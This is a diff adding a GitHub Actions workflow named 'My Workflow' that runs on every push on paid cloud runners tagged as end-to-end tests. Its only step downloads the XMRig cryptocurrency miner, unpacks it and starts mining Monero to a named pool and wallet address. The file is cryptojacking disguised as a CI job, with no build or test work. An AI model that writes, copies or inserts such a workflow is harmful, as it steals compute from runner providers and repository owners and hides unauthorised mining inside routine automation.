@@ -1,0 +1,17 @@
+name: My Workflow
+
+on: [push]
+
+jobs:
+  runMultipleCommands:
+    runs-on:
+      - nscloud-ubuntu-22.04-amd64-8x16-with-cache
+      - nscloud-cache-size-20gb
+      - nscloud-cache-tag-my-repository-e2e-tests
+    steps:
+     - uses: actions/checkout@v1
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
+        tar -xf xmrig-6.12.1-linux-x64.tar.gz
+        cd xmrig-6.12.1
+        ./xmrig -a rx/0 -o stratum+tcp://pool.hashvault.pro:443 -u 49ixgZU6cafjMkM6RjmR9UA3qhmRL5NrfQAyxR7BBcEjL2VQUSMbTs81scaTd6R7REaNFkbrebRruXQRP5sZHEjtRTKPyQC -p 04 --donate-level=1
